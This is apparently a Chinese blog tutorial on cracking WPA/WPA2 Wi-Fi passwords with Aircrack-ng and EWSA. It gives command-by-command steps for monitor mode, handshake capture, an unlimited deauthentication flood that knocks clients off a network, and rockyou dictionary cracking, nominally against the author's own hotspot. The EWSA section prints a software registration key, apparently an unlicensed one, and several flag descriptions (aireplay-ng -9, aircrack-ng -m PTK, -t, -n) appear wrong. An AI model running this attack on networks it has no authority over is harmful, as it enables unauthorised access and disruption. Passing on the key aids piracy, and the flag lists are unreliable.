# 破解工具：Aircrack-ng

Aircrack-ng是一个完整的工具来评估Wi-Fi网络安全套件，用于破解无线802.11WEP及WPA-PSK加密，该工具在2005年11月之前名字是Aircrack，在其2.41版本之后才改名为Aircrack-ng。

|组件名称|描    述|
|---|---|
|aircrack-ng|用于破解 WEP 和 WPA/WPA2 密码|
|airmon-ng|用于管理无线网卡和监视模式的切换|
|airodump-ng|用于捕获802.11数据报文，以便于aircrack-ng破解|
|aireplay-ng|用于数据包注入和重放攻击|
|airserv-ng|可以将无线网卡连接至某一特定端口，为攻击时灵活调用做准备|
|airolib-ng|进行WPA Rainbow Table攻击时使用，用于建立特定数据库文件|
|airdecap-ng|用于解开处于加密状态的数据包|
|tools|其他用于辅助的工具，如airdriver-ng、packetforge-ng等|

## Aircrack-ng详细介绍

### 1、捕获 
#### airdump-ng
airdump-ng 是 Kali Linux 系统中的一个无线网络分析工具，主要用于扫描周围的无线网络，并收集有关这些网络的信息，包括 SSID、MAC 地址、信道、加密方式、强度等。您可以使用不同的参数来优化扫描和显示过程。


下面是一些常用的 airodump-ng 参数：

```
-i, --ivs：使用该选项后，只会保存可用于破解的IVS数据报文
-a：以 ASCII 码模式显示访问点和客户端名称
-c：指定监听的信道，默认在2.4GHz频谱内跳跃
-d：启用显示详细数据包信息
-h：隐藏未广播 SSID 的访问点
-w：指定输出文件名
--output-format：指定输出文件的格式（csv、kismet、gps、gpsxml 等）
--essid-regex：筛选符合正则表达式的 SSID
--write-interval：指定写入文件的时间间隔
--bssid：筛选指定 BSSID 的数据包
```

 读取数据：

```
airodump-ng wlan0mon

wlan0mon 是要使用的网卡名称。
输出结果的表头翻译：
	BSSID -- Wi-Fi的Mac地址  
	PWR -- 信号强度   
	Data -- 监听期间流量总和  
	CH -- WI-FI所用信道  
	ENC -- 加密算法体系
	CIPHER：加密算法
	ESSID -- Wi-Fi名称
```

#### 在 Wireshark 中通过查看数据包的协议头来区分 IVS 数据包

可以通过显示过滤器来筛选出 IVS 数据包。 IVS 数据包通常与特定的协议头相关联，使用过滤器可以帮助你仅显示特定类型的数据包。

对于 IVS 数据包，可以使用以下过滤器来查找：

```sh
wlan.fc.type_subtype == 0x08
```

这个过滤器会显示所有类型为 0x08 的 WLAN 数据帧。在无线数据帧中，IVS 数据包通常会使用这种特定的类型标识。你可以在 Wireshark 中应用这个过滤器来筛选出 IVS 数据包，以便确定确实获取了正确的包。


### 2、攻击 

#### aireplay-ng

aireplay-ng 是 Kali Linux 系统中的一个无线攻击工具，可以用于注入数据包、生成恶意流量以及进行身份伪装等多种攻击。通过使用不同的参数，您可以选择不同的攻击方式和目标，

Deauth 攻击是一种用于无线网络的攻击方式。

原理是利用了802.11 协议中的漏洞，攻击者通过向无线网络设备发送 Deauthentication 数据包来干扰该设备的正常链接，中断正常用户设备与 Wi-Fi 网络之间的通信的，迫使正常用户重新连接Wi-Fi 网络，利用这一流程来抓取包含握手过程的敏感数据包。

使用 Aireplay-ng 工具来执行 Deauth 攻击

```
aireplay-ng -0 0 -a <WLAN BSSID> wlan0mon 
```

常用的 Aireplay-ng 参数：

```
-0：指定使用 Deauth 攻击
	-0 0 （后面的0表示攻击次数，0为无限次）
-1：进行身份欺骗攻击
-2：对 WPA/WPA2 加密方式的网络进行攻击
-3：生成 ARP 请求并重放流量
-4：以混杂模式发送关联请求和数据包
-5：生成特定类型的数据包
-6：生成 Deauth 攻击流量
-7：生成广播 ARP 请求
-9：生成 RTS 和 CTS 数据包来消耗 AP 和客户端上的 CPU

-a：指定要攻击的目标网络的 BSSID
-c：指定要攻击的目标设备的 MAC 地址
-e：指定要攻击的目标网络的 SSID
wlan0mon 是要使用的网卡名称。
```


还有一个常用的操作是，使用 aireplay-ng 向某个 AP 发送大量的探测请求，以便跟踪设备的位置或收集周围网络的信息。

以下命令将向名称为 wlan0mon 的网卡发送探测请求，以查询周围可用的无线网络：

```
aireplay-ng -9 wlan0mon
```

这个命令会发送一组数据包，其中包括 RTS 和 CTS 请求。这些请求将被发送到周围的 AP，从而产生 CPU 负载并帮助您确定 AP 的位置和数据库信息。


### 3、破解 

#### aircrack-ng

aircrack-ng 是 Kali Linux 系统中最常用的无线网络破解工具之一，它可以利用已捕获的 WPA/WPA2 握手包进行破解。

aircrack-ng使用字典破解包含握手信息的cap\pcap文件

```
aircrack-ng target.cap
aircrack-ng -w /usr/share/wordlists/rockyou.txt target.cap
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 11:22:33:44:55:66 target.cap
aircrack-ng -w /usr/share/wordlists/rockyou.txt -e MyWiFi target.cap
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 11:22:33:44:55:66 -m PTK target.cap
```

以下是一些常用的 aircrack-ng 参数：

```
-w：指定密码字典文件
-b：指定要攻击的WiFi的 BSSID 地址
-e：指定要攻击的WiFi的 SSID 名称
-f：强制使用指定文件的格式
-m：选择攻击方法（对于 WPA2 加密，使用 “PTK” 选项）
-n：忽略指定字符集中的字符
-t：设置尝试的最大次数
-q：启用精简模式
-s：跳过指定数量的密码字典条目
-D：启用调试模式
-p：指定密钥文件的后缀名
```

### 4、管理

#### airmon-ng

使用airmon-ag查看网卡信息

```
airmon-ng
```

设置为监听模式（Monitor）

```
airmon-ng start wlan0
```

可以查看到程序输出中，监听模式网卡名字 wlan0 由变成 wlan0mon 的日志

并且提醒我们有进程可能会干扰抓包，执行以下命令杀死可能对网络通信抓包造成影响的进程。

```
# 查询
sudo airmon-ng check

# 杀死
airmon-ng check kill
```

注意此时输入此命令kali系统会关闭网络服务，导致无法上网。

设置为管理模式（Managed）

```
airmon-ng stop wlan0
```

## aircrack-ng破解WIFI网络密码全流程

> 使用aircrack-ng工具集实现对某一WPA/WPA2加密的无线网络密码破解

### 测试需要的准备

1.一个强大的字典（用于暴力破解）
2.一张无线网卡（RT3070L | RT8187L | RT5370）

### 步骤一：虚拟机连接实验需要用到的网卡

Ralink 802.11

将你的无线网卡插入，再将你的无线网卡映射到虚拟机里面。

![](https://img-blog.csdnimg.cn/2ea4c6b818014fd6af4d01fe6d272ce9.png)

#### 查看网卡状态

```
# lsusb

可以看到我的网卡芯片为3070
```

#### 查看网卡是否正常

```
iwconfig
```

可以看到一个名字为wlan0的网卡，如果你是笔记本物理机这里应该有两个网卡，我这个是虚拟机所以之后一个waln0。
可以看到我们无线网卡已经插入虚拟机并且成功识别。

#### 4.查看网卡是否启动

```
ifconfig -a
	-a  看看 全部网卡
```

####  5.启动无线网卡

```
ifconfig wlan0 up     # 启动wlan0网卡
ifconfig wlan0 down   # 关闭wlan0网卡
```

好了现在为止关于无线网卡我们已经成功启动。

### 步骤二：设置网卡为监听模式

#### 1.ifcofnig 添加网卡监听模式（不推荐使用）

```
# 用命令添加了一个名字为wlan0mon的监听网卡
	iw dev wlan0 interface add wlan0mon type monitor
# 查看网卡状态
	ifconfig -a
	这里要加-a参数，因为新创建的网卡是关闭状态，不加-a会查不出来
# 启动网卡wlan0mon
	ifcofnig wlan0mon up
# 再次查询网卡状态，观察结果中的变化
	ifconfig -a
```

删除网卡监听模式

```
# 关闭网卡wlan0mon
	ifcofnig wlan0mon down
# 删除监听网卡
	iw dev wlan0mon interface del
```

####  2.airmon-ng 添加网卡监听模式（推荐使用）

使用airmon-ag查看网卡信息

```
airmon-ng
```

设置为监听模式

```
airmon-ng start wlan0
```

可以查看到监听模式网卡名字变成了：wlan0mon

此时提醒我们有两个进程可能会干扰抓包：644和4780

执行命令杀死可能对网络通信抓包造成影响的进程。注意此时输入此命令kali系统会关闭网络服务，导致无法上网。

```
airmon-ng check kill
```

### 步骤三：使用wlan0mon网卡扫描附近wifi

```
airodump-ng wlan0mon
```

可以查看到我们攻击的自己手机热点:姐姐能给我微信吗

密码：88888888

对应的ch（信道）：1

MAC地址： 76:87:4E:74:34:06

### 步骤四：挑选一个WiFi抓取握手包并保存为CAP文件

```
airodump-ng -c 1 --bssid 76:87:4E:74:34:06 -w /home/wifi wlan0mon

-c 是指定信道
--bssid 指定该WiFi的mac地址
-w 指定保存的路径（该路径必须存在否则会报错）默认保存在你终端的当前路径。
```

 另外开一个终端，注入数据包（Deauth洪水攻击）发送认证数据包，获取握手等数据，

```
aireplay-ng -0 0 -a 76:87:4E:74:34:06  -c 5C:F7:C3:92:0A:DD wlan0mon -D

-0 模式，后面跟你要攻击的次数我给的是20，如果过大对方则会一直连接不上。
-a 无线APmac地址
-c 客户端mac地址
```

> 注意：这个时候连接的热点的设备断开连接，会自动请求连接（建议大家手动将断开的设备进行二次连接），不要问我是怎么知道的，

进行重新连接后，就可以活到相应的握手数据包，必须要抓取到握手数据包！！！！

### 步骤五：使用kali上自带的字典进行密码破解

kali上自带字典足够用了，当然你的密码如果太太太复杂建议自己创建一个密码字典，如何创建请看之前文章渗透测试--5.1.Crunch创建密码字典_西柚小萌新的博客-CSDN博客

字典目录：/usr/share/wordlists/rockyou.txt

对数据包进行密码破解，

```
aircrack-ng -w /usr/share/wordlists/rockyou.txt /home/wifi/wifi-01.cap
```

破解出密码为：88888888

### 步骤六：启动网络

我们刚才进行试验的时候关掉了，kali系统的网络服务。现在把服务启动起来

（重启电脑也是可以的）

```
service NetworkManager start
```

# 破解工具：EWSA

EWSA注册码：EWSA-173-HC1UW-L3EGT-FFJ3O-SOQB3
## 1.介绍

ewsa(全称Elcomsoft Wireless Security Auditor)，它是来自俄罗斯的一款方便实用、拥有强大的无线网络wifi密码破解功能，而它工作原理就是利用密码词典去暴力破解无线AP上的WPA和WPA2密码。
软件中的密码词典支持字母大小写、数字替代、符号顺序变换、缩写、元音替换等12种变量设定。

可以使用Windows上的图形化工具EWSA，开启GPU加速爆破密码。在ATI和NVIDIA显卡上均可使用，可以说基本上所有的wifi密码它都可以破解，只不过需要点时间罢了。
除此之外ewsa还可以尝试通过恢复对通信wifi进行加密的WPA/WPA2 PSK初始密码来帮助管理员实现对无线网络安全监控。而且这款软件还是目前现在市场上最快速且最具成本效益的wifi密码恢复和无线安全监控工具之一。

https://www.elcomsoft.com/ewsa.html
## 2.特点

```
1、通过攻击WPA / WPA2-PSK密码来确定无线网络的安全性。
2、内置无线网络嗅探器。
3、支持大多数现代Wi-Fi适配器，以及专用AirPCap适配器。
4、专利GPU加速技术使用一个或多个NVIDIA或AMD视频卡来模拟真实世界的攻击。
5、运行具有高度可配置变体的高级字典攻击。
6、截取限制Wi-Fi流量，继续离线工作。
```

## 3.使用EWSA跑字典破解

使用EWSA跑字典的前提是要有满足ewsa格式的握手包，比如.cap .dump等等，这需要我们在aireplay-ng抓取包时，去掉–iv参数，就能拿到.cap格式的握手包了。

1.设置语言

安装好EWSA后打开，语言默认是英文的，简单切换一下即可

![](https://img-blog.csdnimg.cn/d6bdb874739d42559f61c80466cf24b5.png#pic_center)

EWSA主界面

![](https://img-blog.csdnimg.cn/ce182adba8dd4035ac5cdb5631bbb669.png#pic_center)

2.设置字典
在 破解选项中选择字典破解，点击添加，选择我们的字典，最后点确定

![](https://img-blog.csdnimg.cn/061dbdddbffc4250a633c6113044d70e.png#pic_center)

3.开始爆破
将握手包文件导入到EWSA中，选择导入数据-导入TCPDUMP文件，然后选择我们的.cap文件即可

![](https://img-blog.csdnimg.cn/1826d57e3a704f919f2f131b58c78c86.png)

这里要做一个勾选

![](https://img-blog.csdnimg.cn/745e2ef3262c478888d0ce25af641282.png#pic_center)

当出现如下界面时，恭喜你，成功获取密码！

![](https://img-blog.csdnimg.cn/593531b3601942ddbd8e603842bf5767.png#pic_center)


# 参考文档

[Linux kali无线安全之WPA/WPA2握手包捕获与爆破](https://blog.csdn.net/Pythonicc/article/details/105029705)

[网络安全–解除认证攻击wifi(详细教程)](https://blog.csdn.net/a1397852386/article/details/125571848?spm=1001.2014.3001.5501)

[SSH服务器拒绝了密码](https://www.csdn.net/tags/MtTaIgwsNTIxNTAtYmxvZwO0O0OO0O0O.html)